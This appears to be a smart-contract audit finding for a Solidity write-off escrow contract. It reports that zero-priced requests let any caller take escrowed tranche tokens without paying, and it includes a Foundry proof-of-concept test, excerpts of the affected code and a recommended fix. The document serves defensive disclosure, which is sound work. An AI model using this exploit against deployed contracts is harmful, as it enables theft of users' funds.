### Title
Zero-priced write-off requests let any fulfiller seize escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` validates that escrowed `amount` is nonzero but accepts `underlyingsRequested == 0`, while `fullfillWriteOffRequest` only rejects an underlying payment below the stored request. [1](#0-0) [2](#0-1) 

### Finding Description
A lender's request escrows tranche tokens and stores an arbitrary underlying ask without enforcing a nonzero or economically meaningful lower bound. [1](#0-0)  Fulfillment is permissionless and only requires the exact tranche amount plus at least the stored ask. [3](#0-2)  When the stored ask is zero, `_underlyings < currentRequest.underlyings` is false for `_underlyings == 0`; the request is deleted, zero underlying is transferred, and the fulfiller receives all escrowed tranche tokens. [4](#0-3) 

### Impact Explanation
Any EOA can immediately take the lender's full escrowed tranche position without paying underlying, resulting in direct theft equal to the deposited tranche amount. [5](#0-4)  The owner’s emergency withdrawal does not prevent this because a fulfiller can execute immediately after the request transaction confirms. [6](#0-5) 

### Likelihood Explanation
The attack requires a lender to create a request with `underlyingsRequested` set to zero, such as through malformed calldata or an integration error. [1](#0-0)  Once present, exploitation is permissionless, atomic, and requires no underlying balance, approval, borrower role, manager role, or Keyring credential. [7](#0-6) 

### Recommendation
Reject zero-priced write-off requests in `createWriteOffRequest`, for example by reverting when `underlyingsRequested == 0`. [8](#0-7)  For a stronger invariant, also validate the ask against an explicit protocol-defined pricing bound before escrow is accepted. [9](#0-8) 

### Proof of Concept
Add this regression test to the existing Foundry test contract in `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`:

```solidity
function testZeroAskWriteOffRequestCanBeSeized() external {
    uint256 requestedTranches = 10_000e18;
    address attacker = makeAddr("zeroAskBuyer");

    uint256 lpUnderlyingBefore = underlying.balanceOf(LP);
    uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);
    uint256 attackerTrancheBefore = tranche.balanceOf(attacker);

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 storedTranches, uint256 storedUnderlyings) =
        escrow.userRequests(LP);
    assertEq(storedTranches, requestedTranches);
    assertEq(storedUnderlyings, 0);

    // No underlying approval or balance is needed for a zero payment.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTrancheBefore, requestedTranches);
    assertEq(underlying.balanceOf(LP), lpUnderlyingBefore);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingBefore);

    (storedTranches, storedUnderlyings) = escrow.userRequests(LP);
    assertEq(storedTranches, 0);
    assertEq(storedUnderlyings, 0);
}
```

### Citations

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L86-101)
```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L118-151)
```text
  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

**File:** contracts/IdleCreditVaultWriteOffEscrow.sol (L170-180)
```text
  /// @notice emergency withdraw function to allow the owner to withdraw tokens from the contract
  /// @param _token address of the token to withdraw
  /// @param _to address to withdraw the tokens to
  /// @param _amount amount of tokens to withdraw
  function emergencyWithdraw(address _token, address _to, uint256 _amount) external {
    _checkOnlyOwner();
    // do not allow to withdraw to the zero address
    if (_to == address(0)) revert Is0();

    IERC20Detailed(_token).safeTransfer(_to, _amount);
  }
```
